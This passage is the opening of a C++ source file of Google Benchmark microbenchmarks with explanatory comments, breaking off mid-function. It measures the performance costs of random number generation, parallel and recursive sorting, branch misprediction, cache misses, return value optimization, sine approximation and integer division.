/**
 *  @brief  Low-level microbenchmarks for building a performance-first mindset.
 *  @file   less_slow.cpp
 *  @author Ash Vardanian
 *
 *  There's no Easter bunny, no tooth fairy... and no free abstractions!
 *  Every abstraction—no matter how elegant—comes with tradeoffs. Sometimes
 *  the cost is in readability, like extra layers of indirection, and other
 *  times, it's in performance, with additional instructions or memory overhead.
 *
 *  This project dives into such tradeoffs, helping engineers develop a deeper
 *  understanding of the costs associated with seemingly simple constructs.
 *  While the examples are written in C++20 and focus on GCC and Clang,
 *  targeting x86_64 and ARM64 architectures, the principles are universal.
 *
 *  The benchmarks cover the costs of numerical operations, designing micro-
 *  kernels, parallelism, computational complexity, branch prediction, compiler
 *  limitations, and @b composing those with callbacks, coroutines, and ranges
 *  into more complex systems. Same principles apply to Rust, Python, and Go,
 *  so parts of the project have been reproduced in those languages.
 *
 *  @see Rust Benchmarks: https://github.com/ashvardanian/less_slow.rs
 *  @see Python Benchmarks: https://github.com/ashvardanian/less_slow.py
 *  @see Go Benchmarks: https://github.com/ashvardanian/less_slow.go
 *
 *  Most measurements were performed on Intel Sapphire Rapids CPUs, but the
 *  findings are relevant across hardware platforms unless explicitly noted.
 *
 *  Worth noting, that some examples may seem over-engineered, but they are
 *  no less relevant or impractical. They may be hard to recognize at first,
 *  but they universally appear in larger codebases, as a form of emergent
 *  complexity.
 *
 *  Let's benchmark them all and dive into the implementation details that
 *  make those abstractions @b less_slow!
 */
#include <benchmark/benchmark.h>

namespace bm = benchmark;

#pragma region - Basics

#pragma region How to Benchmark and Randomness

/**
 *  Using Google Benchmark is simple. You define a C++ function and then
 *  register it using the provided C macros. The suite will invoke your
 *  function, passing a `State` object, that dynamically chooses the number
 *  of loops to run based on the time it takes to execute each cycle.
 *
 *  For simplicity, let's start by benchmarking the most basic operation -
 *  the 32-bit integer addition, universally natively supported by every
 *  modern CPU, be it x86, ARM, or RISC-V, 32-bit or 64-bit, big-endian
 *  or little-endian.
 */
#include <cstdint> // `std::int32_t` and other sized integers

static void i32_addition(bm::State &state) {
    std::int32_t a = 0, b = 0, c = 0;
    for (auto _ : state) c = a + b;
    (void)c; // Silence "variable `c` set but not used" warning
}

BENCHMARK(i32_addition);

/**
 *  Trivial kernels operating on constant values are not the most
 *  straightforward candidates for benchmarking. The compiler can easily
 *  optimize them, and the CPU can predict the result... showing "0ns" - zero
 *  nanoseconds per iteration. Unfortunately, no operation runs this fast on the
 *  computer. On a 3 GHz CPU, you would perform 3 Billion ops every second.
 *  So, each would take 0.33ns, not 0ns. If we change the compilation
 *  settings, discarding the @b `-O3` flag for "Release build" optimizations,
 *  we may see a non-zero value, but it won't represent real-world performance.
 *
 *  Another thing we can try - is generating random inputs on the fly with
 *  @b `std::rand()`, one of the most controversial operations in the
 *  C standard library.
 */
#include <cstdlib> // `std::rand`

static void i32_addition_random(bm::State &state) {
    std::int32_t c = 0;
    for (auto _ : state) c = std::rand() + std::rand();
    (void)c; // Silence "variable `c` set but not used" warning
}

BENCHMARK(i32_addition_random);

/**
 *  Running this will report @b 25ns or about 100 CPU cycles. Is integer
 *  addition really that expensive? It's used all the time, even when you are
 *  accessing @b `std::vector` elements and need to compute the memory address
 *  from the pointer and the index passed to the @b `operator[]` or `at()`
 *  functions. The answer is - no, it's not. The addition takes a single CPU
 *  cycle and is very fast.
 *
 *  Chances are we just benchmarked something else... the @b `std::rand()`
 *  function. What if we could ask Google Benchmark to ignore the time spent
 *  in the `std::rand()` function? There are `PauseTiming` and `ResumeTiming`
 *  functions just for that!
 */

static void i32_addition_paused(bm::State &state) {
    std::int32_t a = 0, b = 0, c = 0;
    for (auto _ : state) {
        state.PauseTiming();
        a = std::rand(), b = std::rand();
        state.ResumeTiming();
        bm::DoNotOptimize(c = a + b);
    }
}

BENCHMARK(i32_addition_paused);

/**
 *  However, the `PauseTiming` and `ResumeTiming` functions are neither free.
 *  In the current implementation, they can easily take @b ~127ns, or around
 *  150 CPU cycles. They are useless in this case, but there is an alternative!
 *
 *  A typical pattern when implementing a benchmark is to initialize with a
 *  random value and then define a very cheap update policy that won't affect
 *  the latency much but will update the inputs. Increments, bit shifts, and bit
 *  rotations are common choices!
 *
 *  It's also a good idea to use native @b CRC32 and @b AES instructions to
 *  produce a random state, as it's often done in StringZilla. Another common
 *  approach is to use integer multiplication, usually derived from the
 *  Golden Ratio, as in the Knuth's multiplicative hash (with `2654435761`).
 *
 *  @see StringZilla: https://github.com/ashvardanian/stringzilla
 */

static void i32_addition_randomly_initialized(bm::State &state) {
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) + (++b));
}

BENCHMARK(i32_addition_randomly_initialized);

/**
 *  On x86, the `i32_addition_randomly_initialized` benchmark performs two
 *  @b `inc` instructions and one @b `add` instruction. This should take less
 *  than @b 0.7ns on a modern CPU. The first cycle increments `a` and `b`
 *  simultaneously on different Arithmetic Logic Units (ALUs) of the same core,
 *  while the second cycle performs the final accumulation. At least @b 97% of
 *  the benchmark time was spent in the `std::rand()` function... even in a
 *  single-threaded benchmark.
 *
 *  This may seem like a trivial example, far removed from "real-world
 *  production systems" of "advanced proprietary software designed by the
 *  world's leading engineers." Sadly, issues like this persist in many
 *  benchmarks and sometimes influence multi-billion-dollar decisions 🤬
 *
 *  @see Bad I/O benchmark examples: https://www.unum.cloud/blog/2022-03-22-ucsb
 *
 *  How bad is it? Let's re-run the same two benchmarks, this time on all cores.
 */
#include <thread> // `std::thread::hardware_concurrency`
#if defined(__linux__)
#include <unistd.h> // `_SC_NPROCESSORS_ONLN`
#elif defined(__APPLE__)
#include <sys/sysctl.h> // `sysctlbyname` on macOS
#endif

std::size_t physical_cores() {
#if defined(__linux__)
    int nproc = sysconf(_SC_NPROCESSORS_ONLN);
    return static_cast<std::size_t>(nproc);
#elif defined(__APPLE__)
    int nproc = 0;
    size_t len = sizeof(nproc);
    sysctlbyname("hw.physicalcpu", &nproc, &len, nullptr, 0);
    return static_cast<std::size_t>(nproc);
#else
    return std::thread::hardware_concurrency();
#endif
}

BENCHMARK(i32_addition_random)->Threads(physical_cores());
BENCHMARK(i32_addition_randomly_initialized)->Threads(physical_cores());

/**
 *  The latency of the `std::rand` variant skyrocketed from @b 15ns in
 *  single-threaded mode to @b 12'000ns when running on multiple threads,
 *  while our optimized variant remained unaffected.
 *
 *  This happens because `std::rand`, like many other LibC functions, relies
 *  on a global state protected by a mutex to ensure thread-safe access.
 *  This mutex-based synchronization becomes a severe bottleneck when multiple
 *  threads contend for the same global resource.
 *
 *  Here's the relevant snippet from the GNU C Library (GlibC) implementation:
 *
 *      long int __random (void) {
 *          int32_t retval;
 *          __libc_lock_lock (lock);
 *          (void) __random_r (&unsafe_state, &retval);
 *          __libc_lock_unlock (lock);
 *          return retval;
 *      }
 *      weak_alias (__random, random)
 *
 *  This perfectly illustrates why experienced low-level engineers often avoid
 *  the "singleton" pattern, where a single shared global state introduces
 *  contention and kills performance under multi-threaded workloads.
 *
 *  @see GlibC implementation:
 *       https://code.woboq.org/userspace/glibc/stdlib/random.c.html#291
 *  @see "Faster random integer generation with batching" by Daniel Lemire:
 *       https://lemire.me/blog/2024/08/17/faster-random-integer-generation-with-batching/
 */

#pragma endregion // How to Benchmark and Randomness

#pragma region Parallelism and Computational Complexity

/**
 *  The most obvious way to speed up code is to parallelize it. Since 2002, CPU
 *  clock speeds have plateaued, with CPUs getting wider instead of faster,
 *  featuring more cores and hardware threads. However, not all algorithms can
 *  be parallelized easily. Some are inherently sequential, while others are
 *  simply too small to benefit from parallel execution.
 *
 *  Let's begin with @b `std::sort`, one of the best-known and best-optimized
 *  algorithms in the C++ Standard Library.
 *
 *  @see Docs for `std::sort`: https://en.cppreference.com/w/cpp/algorithm/sort
 *
 *  A straightforward benchmarking strategy could involve applying a random
 *  shuffle before each sort. However, this would introduce variability, making
 *  the benchmark less predictable. Knowing that `std::sort` uses a Quick-Sort
 *  variant, we can instead reverse the array on each iteration — a classic
 *  worst-case scenario for this family of algorithms.
 *
 *  We can also parameterize the benchmark with runtime-configurable values,
 *  such as the array size and whether to include the preprocessing step.
 *  Google Benchmark provides the @b `Args` function precisely for this purpose.
 */
#include <algorithm> // `std::sort`
#include <numeric>   // `std::iota`
#include <vector>    // `std::vector`

static void sorting(bm::State &state) {

    auto count = static_cast<std::size_t>(state.range(0));
    auto include_preprocessing = static_cast<bool>(state.range(1));

    std::vector<std::uint32_t> array(count);
    std::iota(array.begin(), array.end(), 1u);

    for (auto _ : state) {

        if (!include_preprocessing) state.PauseTiming();
        // Reverse order is the most classical worst case, but not the only one.
        std::reverse(array.begin(), array.end());
        if (!include_preprocessing) state.ResumeTiming();

        std::sort(array.begin(), array.end());
        bm::DoNotOptimize(array.size());
    }
}

BENCHMARK(sorting)->Args({3, false})->Args({3, true});
BENCHMARK(sorting)->Args({4, false})->Args({4, true});
BENCHMARK(sorting)->Args({1024, false})->Args({1024, true});
BENCHMARK(sorting)->Args({8196, false})->Args({8196, true});

/**
 *  This highlights how optimal control flow depends on input size:
 *  - On small inputs, it's faster to perform preprocessing.
 *  - On larger inputs, the overhead from preprocessing outweighs its benefits.
 *
 *  Until C++17, the standard lacked built-in parallel algorithms.
 *  The C++17 standard introduced the @b `std::execution` namespace, including
 *  the @b `std::execution::par_unseq` policy for parallel, order-independent
 *  execution.
 *
 *  To check for support, the @b `__cpp_lib_parallel_algorithm` standard
 *  feature testing macro can be used.
 *
 *  @see Feature testing macros: https://en.cppreference.com/w/cpp/utility/feature_test
 */

#if defined(__cpp_lib_parallel_algorithm)
#include <execution> // `std::execution::par_unseq`

template <typename execution_policy_>
static void sorting_with_executors( //
    bm::State &state, execution_policy_ &&policy) {

    auto count = static_cast<std::size_t>(state.range(0));
    std::vector<std::uint32_t> array(count);
    std::iota(array.begin(), array.end(), 1u);

    for (auto _ : state) {
        std::reverse(policy, array.begin(), array.end());
        std::sort(policy, array.begin(), array.end());
        bm::DoNotOptimize(array.size());
    }

    state.SetComplexityN(count);
    state.SetItemsProcessed(count * state.iterations());
    state.SetBytesProcessed(count * state.iterations() * sizeof(std::int32_t));

    // Want to report something else? Sure, go ahead:
    //
    //      state.counters["temperature_on_mars"] = bm::Counter(-95.4);
    //
    // Just please, for the love of rockets, use the metric system.
    // We've already lost one Mars climate orbiter to a tragic "feet vs. meters"
    // debate. Let's not make NASA cry again. 🚀💥
}

BENCHMARK_CAPTURE(sorting_with_executors, seq, std::execution::seq)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    ->MinTime(10)
    ->Complexity(bm::oNLogN)
    ->UseRealTime();

BENCHMARK_CAPTURE(sorting_with_executors, par_unseq, std::execution::par_unseq)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    ->MinTime(10)
    ->Complexity(bm::oNLogN)
    ->UseRealTime();

/**
 *  Without @b `UseRealTime()`, CPU time is measured by default.
 *  This distinction matters: if your process sleeps, it no longer
 *  accumulates CPU time.
 *
 *  The @b `Complexity` function specifies the asymptotic computational
 *  complexity of the benchmark. To estimate the scaling factor, we benchmark
 *  over a broad range of input sizes, from 2^20 (1 million)
 *  to 2^28 (256 million) entries — translating to 4 MB to 1 GB of data.
 *
 *  This approach outputs both timings and inferred complexity estimates:
 *
 *     sorting_with_executors/seq/1048576            5776408 ns      5776186 ns
 *     sorting_with_executors/seq/4194154           25323450 ns      2532153 ns
 *     sorting_with_executors/seq/16777216         109073782 ns    109071515 ns
 *     sorting_with_executors/seq/67108864         482794615 ns    482777617 ns
 *     sorting_with_executors/seq/268435456       2548725384 ns   2548695506 ns
 *     sorting_with_executors/seq_BigO                  0.34 NlgN       0.34 NlgN
 *     sorting_with_executors/seq_RMS                      8 %             8 %
 *
 *  As demonstrated, scaling isn't strictly linear, especially for tasks
 *  that aren't fully data-parallel.
 *
 *  @see "105 STL Algorithms in Less Than an Hour" by Jonathan Boccara at CppCon 2018:
 *       https://youtu.be/2olsGf6JIkU
 *  @see "The C++17 Parallel Algorithms Library and Beyond"
 *       by Bryce Adelstein Lelbach at CppCon 2016: https://youtu.be/Vck6kzWjY88
 */

#endif // defined(__cpp_lib_parallel_algorithm)

#if defined(_OPENMP)
/**
 *  An alternative to "Parallel STL" is to design a custom parallel solution
 *  using some thread pool or task scheduler. The most common approach is to
 *  divide the input into blocks that can be processed independently and then
 *  implement a tree-like parallel aggregation of partial results.
 *
 *  Many thread pools exist, including the underlying Intel's @b oneTBB,
 *  as well as OpenMP. The latter is not a library, but a broadly adopted
 *  set of compiler directives, capable of parallelizing loops and sections.
 */
#include <omp.h> // `omp_get_max_threads`

std::size_t round_to_multiple(std::size_t value, std::size_t multiple) {
    return ((value + multiple - 1) / multiple) * multiple;
}

static void sorting_with_openmp(bm::State &state) {

    auto const length = static_cast<std::size_t>(state.range(0));
    auto const chunks = static_cast<std::size_t>(omp_get_max_threads());
    // Let's round up chunk lengths to presumably 64-byte cache lines.
    auto const chunk_length = round_to_multiple(length / chunks, 64 / sizeof(std::uint32_t));
    auto const chunk_start_offset = [=](std::size_t i) -> std::size_t {
        std::size_t offset = i * chunk_length;
        return offset < length ? offset : length;
    };

    std::vector<std::uint32_t> array(length);
    std::iota(array.begin(), array.end(), 1u);

    for (auto _ : state) {
        std::reverse(array.begin(), array.end());

#pragma omp parallel for
        // Sort each chunk in parallel
        for (std::size_t i = 0; i < chunks; i++) {
            std::size_t start = chunk_start_offset(i);
            std::size_t finish = chunk_start_offset(i + 1);
            std::sort(array.begin() + start, array.begin() + finish);
        }

        // Merge the blocks in a tree-like fashion doubling the size of the merged block each time
        for (std::size_t merge_step = 1; merge_step < chunks; merge_step *= 2) {
#pragma omp parallel for
            for (std::size_t i = 0; i < chunks; i += 2 * merge_step) {
                std::size_t first_chunk_index = i;
                std::size_t second_chunk_index = i + merge_step;
                if (second_chunk_index >= chunks) continue; // No merge needed

                // We use `inplace_merge` as opposed to `std::merge` to avoid extra memory allocations,
                // but it may not be as fast: https://stackoverflow.com/a/21624819/2766161
                auto start = chunk_start_offset(first_chunk_index);
                auto mid = chunk_start_offset(second_chunk_index);
                auto finish = chunk_start_offset(std::min(second_chunk_index + merge_step, chunks));
                std::inplace_merge(array.begin() + start, array.begin() + mid, array.begin() + finish);
            }
        }

        bm::DoNotOptimize(array.size());
    }

    state.SetComplexityN(length);
    state.SetItemsProcessed(length * state.iterations());
    state.SetBytesProcessed(length * state.iterations() * sizeof(std::uint32_t));
}

BENCHMARK(sorting_with_openmp)
    ->RangeMultiplier(4)
    ->Range(1l << 20, 1l << 28)
    ->MinTime(10)
    ->Complexity(bm::oNLogN)
    ->UseRealTime();

#endif // defined(_OPENMP)

#pragma endregion // Parallelism and Computational Complexity

#pragma region Recursion

/**
 *  The `std::sort` and the underlying Quick-Sort are perfect research subjects
 *  for benchmarking and understanding how the computer works. Naively
 *  implementing the Quick-Sort in C/C++ would still put us at disadvantage,
 *  compared to the STL.
 *
 *  Most implementations we can find in textbooks, use recursion. Recursion is a
 *  beautiful concept, but it's not always the best choice for performance. Every
 *  nested call requires a new stack frame, and the stack is limited. Moreover,
 *  local variables need to be constructed and destructed, and the CPU needs to
 *  jump around in memory.
 *
 *  The alternative, as it often is in computing, is to use compensate runtime
 *  issue with memory. We can use a stack data structure to continuously store
 *  the state of the algorithm, and then process it in a loop.
 *
 *  The same ideas common appear when dealing with trees or graph algorithms.
 */
#include <utility> // `std::swap`

/**
 *  @brief  Quick-Sort helper function for array partitioning, reused by both
 *          recursive and iterative implementations.
 */
template <typename element_type_>
struct quick_sort_partition {
    using element_t = element_type_;

    inline std::ptrdiff_t operator()(element_t *arr, std::ptrdiff_t const low, std::ptrdiff_t const high) noexcept {
        element_t pivot = arr[high];
        std::ptrdiff_t i = low - 1;
        for (std::ptrdiff_t j = low; j <= high - 1; j++) {
            if (arr[j] > pivot) continue;
            i++;
            std::swap(arr[i], arr[j]);
        }
        std::swap(arr[i + 1], arr[high]);
        return i + 1;
    }
};

/**
 *  @brief  Quick-Sort implementation as a C++ function object, using recursion.
 *          Note, recursion and @b inlining are not compatible.
 */
template <typename element_type_>
struct quick_sort_recurse {
    using element_t = element_type_;
    using quick_sort_partition_t = quick_sort_partition<element_t>;
    using quick_sort_recurse_t = quick_sort_recurse<element_t>;

    void operator()(element_t *arr, std::ptrdiff_t low, std::ptrdiff_t high) noexcept {
        if (low >= high) return;
        auto pivot = quick_sort_partition_t {}(arr, low, high);
        quick_sort_recurse_t {}(arr, low, pivot - 1);
        quick_sort_recurse_t {}(arr, pivot + 1, high);
    }
};

/**
 *  @brief  Quick-Sort implementation as a C++ function object, with iterative
 *          deepening using a "stack" data-structure.
 *
 *  Note, this implementation can be inlined, but can't be @b `noexcept`, due to
 *  a potential memory allocation in the `std::vector::resize` function.
 *
 *  Fun fact: The `std::vector` is actually a better choice for a "stack" than
 *  the `std::stack`, as the latter builds on top of a `std::deque`, which is
 *  normally implemented as a sequence of individually allocated fixed-size arrays,
 *  with additional bookkeeping. In our logic we never need to pop from the middle
 *  or from the front, so a `std::vector` is a better choice.
 */

template <typename element_type_>
struct quick_sort_iterate {
    using element_t = element_type_;
    using quick_sort_partition_t = quick_sort_partition<element_t>;

    std::vector<std::ptrdiff_t> stack;

    void operator()(element_t *arr, std::ptrdiff_t low, std::ptrdiff_t high) noexcept(false) {

        stack.resize((high - low + 1) * 2);
        std::ptrdiff_t top = -1;

        stack[++top] = low;
        stack[++top] = high;

        while (top >= 0) {
            high = stack[top--];
            low = stack[top--];
            auto pivot = quick_sort_partition_t {}(arr, low, high);

            // If there are elements on left side of pivot,
            // then push left side to stack
            if (low < pivot - 1) {
                stack[++top] = low;
                stack[++top] = pivot - 1;
            }

            // If there are elements on right side of pivot,
            // then push right side to stack
            if (pivot + 1 < high) {
                stack[++top] = pivot + 1;
                stack[++top] = high;
            }
        }
    }
};

template <typename sorter_type_, std::size_t length_> //
static void recursion_cost(bm::State &state) {
    using element_t = typename sorter_type_::element_t;
    sorter_type_ sorter;
    std::vector<element_t> arr(length_);
    for (auto _ : state) {
        for (std::size_t i = 0; i != length_; ++i) arr[i] = length_ - i;
        sorter(arr.data(), 0, static_cast<std::ptrdiff_t>(length_ - 1));
    }
}

using recursive_sort_i32s = quick_sort_recurse<std::int32_t>;
using iterative_sort_i32s = quick_sort_iterate<std::int32_t>;

BENCHMARK_TEMPLATE(recursion_cost, recursive_sort_i32s, 16);
BENCHMARK_TEMPLATE(recursion_cost, iterative_sort_i32s, 16);
BENCHMARK_TEMPLATE(recursion_cost, recursive_sort_i32s, 256);
BENCHMARK_TEMPLATE(recursion_cost, iterative_sort_i32s, 256);
BENCHMARK_TEMPLATE(recursion_cost, recursive_sort_i32s, 4096);
BENCHMARK_TEMPLATE(recursion_cost, iterative_sort_i32s, 4096);

/**
 *  If you try pushing the size further, the program will likely @b crash due
 *  to @b stack_overflow. The recursive version is limited by the stack size, while
 *  the iterative version can handle much larger inputs.
 *
 *  As can be seen from our benchmarks, the STL implementation of `std::sort`
 *  is more efficient than our naive kernels, and it's only one of many expressive
 *  solutions in the @b <algorithm> header.
 */

#pragma endregion // Recursion

#pragma region Branch Prediction

/**
 *  The `if` statement and the seemingly innocent ternary operator `x ? a : b`
 *  can be surprisingly expensive in performance-critical code. This is
 *  especially noticeable when conditional execution operates at the byte level,
 *  as in text processing, parsing, searching, compression, encoding, and
 *  similar tasks.
 *
 *  Modern CPUs have sophisticated branch predictors — some of the most complex
 *  hardware components in a processor. These predictors memorize recent branch
 *  patterns, enabling "speculative execution," where the CPU starts processing
 *  the next task (`i+1`) before fully completing the current one (`i`).
 *
 *  While a single `if` in a hot-path is usually not a problem, real-world
 *  applications often involve thousands of branches. On most modern CPUs, up
 *  to @b 4096 branches can be memorized. Beyond that, branch mis-predictions
 *  occur, causing a severe slowdown due to pipeline stalls.
 *
 *  Consider this example: The same snippet can run at @b 0.7ns per operation
 *  when branch predictions are accurate but slows down to @b 3.7ns when
 *  predictions fail.
 */
static void branch_cost(bm::State &state) {
    auto count = static_cast<std::size_t>(state.range(0));
    std::vector<std::int32_t> random_values(count);
    std::generate_n(random_values.begin(), random_values.size(), &std::rand);
    std::int32_t variable = 0;
    std::size_t iteration = 0;

    for (auto _ : state) {
        std::int32_t random = random_values[(++iteration) & (count - 1)];
        bm::DoNotOptimize( //
            variable =     //
            (random & 1)   //
                ? (variable + random)
                : (variable * random));
    }
}

BENCHMARK(branch_cost)->RangeMultiplier(4)->Range(256, 32 * 1024);

#pragma endregion // Branch Prediction

#pragma region Cache Misses

/**
 *  Over the decades, CPU speeds have outpaced memory speeds, creating a gap
 *  mitigated by multi-level caching (L1/L2/L3). Cache misses occur when the
 *  CPU fetches data from RAM instead of the cache, incurring high latency.
 *
 *  Access patterns play a crucial role:
 *      - @b Sequential: Predictable and optimal for the CPU prefetcher.
 *      - @b Random: Unpredictable, leading to frequent cache misses.
 *
 *  Benchmarks demonstrate this gap—sequential access can outperform random access
 *  by 10x or more for data sizes exceeding cache capacity. However, the difference
 *  narrows for smaller datasets, benefiting from spatial and temporal locality.
 */

#include <random> // `std::random_device`, `std::mt19937`

enum class access_order { sequential, random };

template <access_order access_order_>
static void cache_misses_cost(bm::State &state) {
    auto count = static_cast<std::uint32_t>(state.range(0));

    // Populate with arbitrary data
    std::vector<std::int32_t> data(count);
    std::iota(data.begin(), data.end(), 0);

    // Initialize different access orders
    std::vector<std::uint32_t> indices(count);
    if constexpr (access_order_ == access_order::random) {
        std::random_device random_device;
        std::mt19937 generator(random_device());
        std::uniform_int_distribution<std::uint32_t> uniform_distribution(0, count - 1);
        std::generate_n(indices.begin(), indices.size(), [&] { return uniform_distribution(generator); });
    }
    else { std::iota(indices.begin(), indices.end(), 0u); }

    // The actual benchmark:
    for (auto _ : state) {
        std::int64_t sum = 0;
        for (auto index : indices) bm::DoNotOptimize(sum += data[index]);
    }
}

BENCHMARK(cache_misses_cost<access_order::sequential>)
    ->MinTime(2)
    ->RangeMultiplier(8)
    ->Range(8u * 1024u, 128u * 1024u * 1024u);
BENCHMARK(cache_misses_cost<access_order::random>)
    ->MinTime(2)
    ->RangeMultiplier(8)
    ->Range(8u * 1024u, 128u * 1024u * 1024u);

/**
 *  For small arrays, the execution speed will be identical.
 *  For larger ones, the latency can differ @b 15x!
 */

#pragma endregion // Cache Misses

#pragma region Return Value Optimization

/**
 *  The Return Value Optimization (RVO) is a compiler optimization that elides
 *  the copy constructor and destructor calls when returning a local object by
 *  value. This optimization is crucial for performance, especially when dealing
 *  with heavy objects.
 */
#include <optional> // `std::optional`

std::optional<std::string> make_heavy_object_mutable() {
    std::string x(1024, 'x');
    return x;
}

std::optional<std::string> make_heavy_object_immutable() {
    std::string const x(1024, 'x'); //! `const` is the only difference
    return x;
}

static void rvo_friendly(bm::State &state) {
    for (auto _ : state) bm::DoNotOptimize(make_heavy_object_mutable());
}

static void rvo_impossible(bm::State &state) {
    for (auto _ : state) bm::DoNotOptimize(make_heavy_object_immutable());
}

BENCHMARK(rvo_friendly);
BENCHMARK(rvo_impossible);

/**
 *  Despite intuition, marking a local object as `const` hurts our performance.
 *  The RVO-friendly version takes 21ns, while the second one takes 36ns, @b 70% longer!
 */

#pragma endregion // Return Value Optimization

#pragma endregion // - Basics

#pragma region - Numerics

#pragma region Accuracy vs Efficiency of Standard Libraries

/**
 *  Numerical computing is a core subject in high-performance computing (HPC)
 *  research and graduate studies, yet its foundational concepts are more
 *  accessible than they seem. Let's start with one of the most basic operations
 *  — computing the @b sine of a number.
 */
#include <cmath> // `std::sin`

static void f64_sin(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) bm::DoNotOptimize(result = std::sin(argument += 1.0));
}

BENCHMARK(f64_sin);

/**
 *  Standard C library functions like `sin` and `sinf` are designed for maximum
 *  accuracy, often at the cost of performance. We can explore approximations
 *  to trade precision for speed.
 *
 *  A common approach is using the Taylor-Maclaurin @b series — a polynomial
 *  expansion of a function around a point. By limiting the expansion to a few
 *  terms, we can approximate `sin(x)` as:
 *
 *      sin(x) ≈ x - (x^3)/3! + (x^5)/5!
 *
 *  This reduces the computational cost but comes with reduced accuracy.
 *
 *  @see Taylor series: https://en.wikipedia.org/wiki/Taylor_series
 */

static void f64_sin_maclaurin(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) {
        argument += 1.0;
        result = argument - std::pow(argument, 3) / 6 + std::pow(argument, 5) / 120;
        bm::DoNotOptimize(result);
    }
}

BENCHMARK(f64_sin_maclaurin);

/**
 *  Result: latency reduction from @b 31ns down to @b 21ns on Intel.
 *  But on Apple M2 Pro, the latency grew from @b 4.8ns to @b 15.2ns 🤯
 *  Doesn't feel like a win!
 *
 *  The @b `std::pow` function is highly generic and not optimized for small,
 *  constant integer exponents. It can be the case, that:
 *
 *      - `std::pow(1.00000000000001, 1.4)` takes 53ns
 *      - `std::pow(1.00000000000001, 1.5)` takes 63,348ns (1000x slower)
 *
 *  We can implement a specialized version for faster @b and slightly more
 *  accurate results, targeting only our specific integer powers.
 *
 *  @see "Slow power computation by 64-bit glibc" by Jason Summers:
 *       https://entropymine.com/imageworsener/slowpow/
 *  @see "When a Microsecond Is an Eternity" by Carl Cook at CppCon 2017:
 *       https://youtu.be/NH1Tta7purM
 */

static void f64_sin_maclaurin_powless(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) {
        argument += 1.0;
        result = (argument) - (argument * argument * argument) / 6.0 +
                 (argument * argument * argument * argument * argument) / 120.0;
        bm::DoNotOptimize(result);
    }
}

BENCHMARK(f64_sin_maclaurin_powless);

/**
 *  Result: latency reduction to @b 2ns - a @b 15x speedup on Intel.
 *  On Apple M2 Pro, the latency dropped from @b 15.2ns to @b 1.1ns 🚀
 *  Now this is a win!
 *
 *  We can force the compiler to bypass IEEE-754 compliance checks using
 *  "fast-math" attributes, enabling aggressive floating-point optimizations.
 *
 *  Different compilers support this via:
 *  - Clang and GCC: `-ffast-math`
 *  - ICC: `-fp-model=fast`
 *  - MSVC: `/fp:fast`
 *
 *  The GCC syntax can be:
 *  - Old: `__attribute__((optimize("-ffast-math")))`
 *  - New: `[[gnu::optimize("-ffast-math")]]`
 *
 *  Among other things, this may reorder floating-point operations, ignoring
 *  that floating-point arithmetic isn't strictly associative. So if you have
 *  long chains of arithmetic operations, with a arguments significantly
 *  differing in magnitude, you may get highly inaccurate results.
 *
 *  @see "Beware of fast-math" by Simon Byrne: https://simonbyrne.github.io/notes/fastmath/
 */
#if defined(__GNUC__) && !defined(__clang__)
#define FAST_MATH [[gnu::optimize("-ffast-math")]]
#elif defined(__clang__)
#define FAST_MATH __attribute__((target("-ffast-math")))
#else
#define FAST_MATH
#endif

FAST_MATH static void f64_sin_maclaurin_with_fast_math(bm::State &state) {
    double argument = std::rand(), result = 0;
    for (auto _ : state) {
        argument += 1.0;
        result = (argument) - (argument * argument * argument) / 6.0 +
                 (argument * argument * argument * argument * argument) / 120.0;
        bm::DoNotOptimize(result);
    }
}

BENCHMARK(f64_sin_maclaurin_with_fast_math);

/**
 *  Result: latency of @b 0.8ns - almost @b 40x faster than the standard
 *  on Intel, but on Arm the result remained unchanged, the same @b 1.1ns.
 *
 *  Advanced libraries like SimSIMD and SLEEF can achieve even better
 *  performance through SIMD-optimized implementations, sometimes trading
 *  accuracy or the breadth of the input range for speed.
 *
 *  @see SimSIMD repository: https://github.com/ashvardanian/simsimd
 *  @see SLEEF repository: https://github.com/shibatch/sleef
 */

#pragma endregion // Accuracy vs Efficiency of Standard Libraries

#pragma region Expensive Integer Operations

template <typename scalar_type_>
scalar_type_ square(scalar_type_ x) noexcept {
    return x * x;
}

/**
 *  It's common knowledge that floating-point math can be costly, but even
 *  integer operations can be surprisingly expensive. @b Division and modulo
 *  operations are notorious examples.
 */
static void integral_division(bm::State &state) {
    std::int64_t a = square<std::int64_t>(std::rand()), b = square<std::int64_t>(std::rand()), c;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) / (++b));
}

BENCHMARK(integral_division);

/**
 *  Division takes around ~10 CPU cycles or @b 2.5ns. However, if the divisor
 *  is known at compile time, the compiler can replace the division with
 *  faster shift and multiply instructions — even for large prime numbers
 *  like  `2147483647`.
 *
 *  @see More Details: https://www.sciencedirect.com/science/article/pii/S2405844021015450
 */
static void integral_division_by_constexpr(bm::State &state) {
    constexpr std::int64_t b = 2147483647;
    std::int64_t a = std::rand(), c;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) / b);
}

BENCHMARK(integral_division_by_constexpr);

/**
 *  The @b `constexpr` specifier is not strictly required if the compiler can
 *  deduce that a value is constant at compile time. However, this optimization
 *  can affect benchmarking results by eliminating divisions entirely through
 *  strength reduction (replacing division with faster operations like shifts
 *  and multiplications).
 *
 *  To ensure the division is evaluated at runtime, forcing the compiler to
 *  treat the divisor as a mutable value, wrap it with @b `std::launder`. This
 *  prevents constant propagation and keeps the benchmark realistic.
 */
#include <new> // `std::launder`

static void integral_division_by_const(bm::State &state) {
    std::int64_t b = 2147483647;
    std::int64_t a = square<std::int64_t>(std::rand()), c = 0;
    for (auto _ : state) bm::DoNotOptimize(c = (++a) / *std::launder(&b));
}

BENCHMARK(integral_division_by_const);

/**
 *  An important optimization trick is that 32-bit integer division can be
 *  performed using 64-bit double-precision floating-point division. This
 *  technique takes advantage of the CPU's highly optimized floating-point
 *  division unit, reducing the operation's latency from approximately
 *  @b 2.5ns to @b 0.5ns.
 *
 *  Since 64-bit doubles can exactly represent all 32-bit signed integers,
 *  this method introduces @b no precision loss, making it a safe and efficient
 *  alternative when division performance is critical.
 */
static void integral_division_with_doubles(bm::State &state) {
    std::int32_t a = std::rand(), b = std::rand(), c = 0;
    for (auto _ : state)
